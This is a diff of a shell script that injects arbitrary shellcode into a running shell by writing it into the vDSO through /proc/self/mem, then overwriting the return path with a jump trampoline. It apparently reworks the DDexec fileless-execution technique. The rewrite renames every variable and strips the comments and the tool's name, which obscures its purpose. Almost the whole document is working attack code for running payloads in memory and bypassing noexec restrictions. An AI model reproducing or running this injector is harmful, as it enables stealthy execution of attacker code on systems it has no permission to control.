@@ -1,188 +1,142 @@
 #!/bin/sh
 
-# Prepend the shellcode with an infinite loop (so you can attach to it with gdb)
-# Then in gdb just use `set $pc+=2' and you will be able to `si'.
-# In ARM64 use `set $pc+=4'.
-if [ -z "$DEBUG" ]; then DEBUG=0; fi
+[ -z "$DBG_MODE" ] && DBG_MODE=0
+[ -z "$USE_LOADER" ] && USE_LOADER=0
+[ -z "$SEARCH_TOOL" ] && SEARCH_TOOL=tail || SEARCH_TOOL="$SEARCH_TOOL"
+SEARCH_TOOL=$(command -v "$SEARCH_TOOL")
+TOOL_NAME=$(basename $(readlink -f $SEARCH_TOOL))
+[ -z ${TOOL_NAME##*box*} ] && SEARCH_TOOL=$(command -v "dd")
 
-# If the seeker binary is not executable by your user, you may try to run it
-# through the loader (typically ld.so).
-if [ -z "$USE_INTERP" ]; then USE_INTERP=0; fi
-
-# Currently tail is the default binary used to lseek() through the mem file.
-if [ -z "$SEEKER" ]; then seeker=tail; else seeker="$SEEKER"; fi
-seeker=$(command -v "$seeker") # Harry Potter vibes? Nah.
-realname=$(basename $(readlink -f $seeker))
-if [ -z ${realname##*box*} ] # Busybox / Toybox
-then
-    seeker=$(command -v "dd")
-fi
-
-# Endian conversion
-endian()
+convert_endian()
 {
     echo -n ${1:14:2}${1:12:2}${1:10:2}${1:8:2}${1:6:2}${1:4:2}${1:2:2}${1:0:2}
 }
 
-# search_section $filename $section
-search_section()
+find_section()
 {
-    local data=""
-    local header=$(od -v -t x1 -N 64 $1 | head -n -1 |\
-                   cut -d' ' -f 2- | tr -d ' \n')
-    # I'm not commenting this, RTFM.
-    local shoff=${header:80:16}
-    shoff=$(endian $shoff)
-    shoff=$((0x$shoff))
-    local shentsize=${header:116:4}
-    shentsize=$(endian $shentsize)
-    shentsize=$((0x$shentsize))
-    local shentnum=${header:120:4}
-    shentnum=$(endian $shentnum)
-    shentnum=$((0x$shentnum))
-    local shsize=$((shentnum * shentsize))
-    local shstrndx=${header:124:4}
-    shstrndx=$(endian $shstrndx)
-    shstrndx=$((0x$shstrndx))
-    sections=$(od -v -t x1 -N $shsize -j $shoff $1 | head -n-1 |\
-               cut -d' ' -f2- | tr -d ' \n')
+    local segment=""
+    local hdr=$(od -v -t x1 -N 64 $1 | head -n -1 | cut -d' ' -f 2- | tr -d ' \n')
+    local sect_hdr_offset=${hdr:80:16}
+    sect_hdr_offset=$(convert_endian $sect_hdr_offset)
+    sect_hdr_offset=$((0x$sect_hdr_offset))
+    local sect_entry_size=${hdr:116:4}
+    sect_entry_size=$(convert_endian $sect_entry_size)
+    sect_entry_size=$((0x$sect_entry_size))
+    local sect_entry_count=${hdr:120:4}
+    sect_entry_count=$(convert_endian $sect_entry_count)
+    sect_entry_count=$((0x$sect_entry_count))
+    local sect_table_size=$((sect_entry_count * sect_entry_size))
+    local str_table_index=${hdr:124:4}
+    str_table_index=$(convert_endian $str_table_index)
+    str_table_index=$((0x$str_table_index))
+    segments=$(od -v -t x1 -N $sect_table_size -j $sect_hdr_offset $1 | head -n-1 | cut -d' ' -f2- | tr -d ' \n')
 
-    local shstrtab_off=$((((shstrndx * shentsize) + 24) * 2))
-    shstrtab_off=${sections:$shstrtab_off:16}
-    shstrtab_off=$(endian $shstrtab_off)
-    shstrtab_off=$((0x$shstrtab_off))
-    local shstrtab_size=$((((shstrndx * shentsize) + 32) * 2))
-    shstrtab_size=${sections:$shstrtab_size:16}
-    shstrtab_size=$(endian $shstrtab_size)
-    shstrtab_size=$((0x$shstrtab_size))
-    local strtab=$(od -v -t x1 -N $shstrtab_size -j $shstrtab_off $1 |\
-                   head -n-1 | cut -d' ' -f2- | tr -d ' \n')
+    local str_table_offset=$((((str_table_index * sect_entry_size) + 24) * 2))
+    str_table_offset=${segments:$str_table_offset:16}
+    str_table_offset=$(convert_endian $str_table_offset)
+    str_table_offset=$((0x$str_table_offset))
+    local str_table_size=$((((str_table_index * sect_entry_size) + 32) * 2))
+    str_table_size=${segments:$str_table_size:16}
+    str_table_size=$(convert_endian $str_table_size)
+    str_table_size=$((0x$str_table_size))
+    local str_data=$(od -v -t x1 -N $str_table_size -j $str_table_offset $1 | head -n-1 | cut -d' ' -f2- | tr -d ' \n')
 
-    for i in $(seq 0 $((shentnum - 1)))
+    for i in $(seq 0 $((sect_entry_count - 1)))
     do
-        local section=${sections:$((i * shentsize * 2)):$((shentsize * 2))}
-        local section_name_idx=$((0x$(endian ${section:0:8})))
-        local name=$(echo -n $2 | od -v -t x1 | head -n-1 | cut -d' ' -f2- |\
-        tr -d ' \n')00
-        local section_name=${strtab:$section_name_idx * 2:${#name}}
-        if [ $section_name = $name ]
+        local sec=${segments:$((i * sect_entry_size * 2)):$((sect_entry_size * 2))}
+        local sec_name_idx=$((0x$(convert_endian ${sec:0:8})))
+        local search_name=$(echo -n $2 | od -v -t x1 | head -n-1 | cut -d' ' -f2- | tr -d ' \n')00
+        local sec_name=${str_data:$sec_name_idx * 2:${#search_name}}
+        if [ $sec_name = $search_name ]
         then
-            local section_off=${section:24 * 2:16}
-            section_off=$(endian $section_off)
-            section_off=$((0x$section_off))
+            local sec_offset=${sec:24 * 2:16}
+            sec_offset=$(convert_endian $sec_offset)
+            sec_offset=$((0x$sec_offset))
 
-            local section_addr=${section:16 * 2:16}
-            section_addr=$(endian $section_addr)
-            section_addr=$((0x$section_addr))
+            local sec_addr=${sec:16 * 2:16}
+            sec_addr=$(convert_endian $sec_addr)
+            sec_addr=$((0x$sec_addr))
 
-            local section_size=${section:32 * 2:16}
-            section_size=$(endian $section_size)
-            section_size=$((0x$section_size))
+            local sec_size=${sec:32 * 2:16}
+            sec_size=$(convert_endian $sec_size)
+            sec_size=$((0x$sec_size))
 
-            local section_size_ent=${section:56 * 2:16}
-            section_size_ent=$(endian $section_size_ent)
-            section_size_ent=$((0x$section_size_ent))
+            local sec_size_ent=${sec:56 * 2:16}
+            sec_size_ent=$(convert_endian $sec_size_ent)
+            sec_size_ent=$((0x$sec_size_ent))
 
-            echo -n $section_off $section_size $section_addr $section_size_ent
+            echo -n $sec_offset $sec_size $sec_addr $sec_size_ent
             break
         fi
     done
 }
 
-# Read shellcode from stdin
-if [ "$1" = "-x" ]
-then
-    read -r sc
-else
-    sc=$(od -v -t x1 | head -n-1 | cut -d' ' -f2- | tr -d ' \n')
-fi
+[ "$1" = "-x" ] && read -r scode || scode=$(od -v -t x1 | head -n-1 | cut -d' ' -f2- | tr -d ' \n')
+cpu_arch=$(uname -m)
 
-arch=$(uname -m)
-
-# dup2(2, 0);
-if [ "$arch" = "x86_64" ]
+if [ "$cpu_arch" = "x86_64" ]
 then
-    sc="4831c04889c6b0024889c7b0210f05"$sc
-elif [ "$arch" = "aarch64" ]
+    scode="4831c04889c6b0024889c7b0210f05"$scode
+elif [ "$cpu_arch" = "aarch64" ]
 then
-    sc="080380d2400080d2010080d2010000d4"$sc
+    scode="080380d2400080d2010080d2010000d4"$scode
 else
-    echo "DDexec: Error, this architecture is not supported." >&2
+    echo "Error: Unsupported architecture." >&2
     exit
 fi
-sc_len=$(printf %016x $((${#sc} / 2)))
+scode_len=$(printf %016x $((${#scode} / 2)))
 
-shell=$(readlink -f /proc/$$/exe)
-# Make zsh behave somewhat like bash
-if [ -n "$($shell --version 2> /dev/null | grep zsh)" ]
+shell_path=$(readlink -f /proc/$$/exe)
+if [ -n "$($shell_path --version 2> /dev/null | grep zsh)" ]
 then
     setopt SH_WORD_SPLIT
     setopt KSH_ARRAYS
 fi
 
-# Interpreter (loader) for our seeker
-if [ $USE_INTERP -eq 1 ]
+if [ $USE_LOADER -eq 1 ]
 then
-    interp_off=$(search_section $seeker .interp)
-    if [ -n "interp_off" ]
+    loader_offset=$(find_section $SEARCH_TOOL .interp)
+    if [ -n "loader_offset" ]
     then
-        interp_size=$(echo $interp_off | cut -d' ' -f2)
-        interp_off=$(echo $interp_off | cut -d' ' -f1)
-        interp_=$(tail -c +$(($interp_off + 1)) $seeker |\
-                  head -c $((interp_size - 1)))
+        loader_size=$(echo $loader_offset | cut -d' ' -f2)
+        loader_offset=$(echo $loader_offset | cut -d' ' -f1)
+        loader=$(tail -c +$(($loader_offset + 1)) $SEARCH_TOOL | head -c $((loader_size - 1)))
     fi
 fi
 
-# The shellcode will be written into the vDSO
-vdso_addr=$((0x$(grep -F "[vdso]" /proc/$$/maps | cut -d'-' -f1)))
-# Trampoline to jump to the shellcode
-if [ "$arch" = "x86_64" ]
+vdso_base=$((0x$(grep -F "[vdso]" /proc/$$/maps | cut -d'-' -f1)))
+
+if [ "$cpu_arch" = "x86_64" ]
 then
-    jmp="48b8"$(endian $(printf %016x $vdso_addr))"ffe0"
-elif [ "$arch" = "aarch64" ]
+    jump_code="48b8"$(convert_endian $(printf %016x $vdso_base))"ffe0"
+elif [ "$cpu_arch" = "aarch64" ]
 then
-    jmp="4000005800001fd6"$(endian $(printf %016x $vdso_addr))
+    jump_code="4000005800001fd6"$(convert_endian $(printf %016x $vdso_base))
 fi
 
-sc=$(printf $sc | sed 's/\([0-9A-F]\{2\}\)/\\x\1/gI')
-jmp=$(printf $jmp | sed 's/\([0-9A-F]\{2\}\)/\\x\1/gI')
+scode=$(printf $scode | sed 's/\([0-9A-F]\{2\}\)/\\x\1/gI')
+jump_code=$(printf $jump_code | sed 's/\([0-9A-F]\{2\}\)/\\x\1/gI')
 
 read syscall_info < /proc/self/syscall
-addr=$(($(echo $syscall_info | cut -d' ' -f9)))
+mem_addr=$(($(echo $syscall_info | cut -d' ' -f9)))
 exec 3>/proc/self/mem
 
-# Arguments' format for the chosen seeker
-if [ -z "$SEEKER_ARGS" ]
-then
-    if [ $(basename $seeker) = "tail" ]
-    then
-        SEEKER_ARGS='-c +$(($offset + 1))'
-    elif   [ $(basename $seeker) = "dd" ]
-    then
-        SEEKER_ARGS='bs=1 skip=$offset'
-    elif [ $(basename $seeker) = "hexdump" ]
-    then
-        SEEKER_ARGS='-s $offset'
-    elif [ $(basename $seeker) = "cmp" ]
-    then
-        SEEKER_ARGS='-i $offset /dev/null'
-    else
-        echo "DDexec: Unknown seeker. Provide its arguments in SEEKER_ARGS."
-        exit 1
-    fi
-fi
+[ -z "$SEARCH_ARGS" ] && \
+  { [ $(basename $SEARCH_TOOL) = "tail" ] && SEARCH_ARGS='-c +$(($offset + 1))'; } || \
+  { [ $(basename $SEARCH_TOOL) = "dd" ] && SEARCH_ARGS='bs=1 skip=$offset'; } || \
+  { [ $(basename $SEARCH_TOOL) = "hexdump" ] && SEARCH_ARGS='-s $offset'; } || \
+  { [ $(basename $SEARCH_TOOL) = "cmp" ] && SEARCH_ARGS='-i $offset /dev/null'; } || \
+  { echo "Error: Unknown search tool. Provide its arguments in SEARCH_ARGS."; exit 1; }
 
-# Overwrite vDSO with our shellcode
-seeker_args=${SEEKER_ARGS/'$offset'/$vdso_addr}
-seeker_args="$(eval echo -n \"$seeker_args\")"
-$interp_ $seeker $seeker_args <&3 >/dev/null 2>&1
-printf $sc >&3
+search_tool_args=${SEARCH_ARGS/'$offset'/$vdso_base}
+search_tool_args="$(eval echo -n \"$search_tool_args\")"
+$loader $SEARCH_TOOL $search_tool_args <&3 >/dev/null 2>&1
+printf $scode >&3
 
 exec 3>&-
 exec 3>/proc/self/mem
 
-# Write jump instruction where it will be found shortly
-seeker_args=${SEEKER_ARGS/'$offset'/$addr}
-seeker_args="$(eval echo -n \"$seeker_args\")"
-$interp_ $seeker $seeker_args <&3 >/dev/null 2>&1
-printf $jmp >&3
+search_tool_args=${SEARCH_ARGS/'$offset'/$mem_addr}
+search_tool_args="$(eval echo -n \"$search_tool_args\")"
+$loader $SEARCH_TOOL $search_tool_args <&3 >/dev/null 2>&1
+printf $jump_code >&3
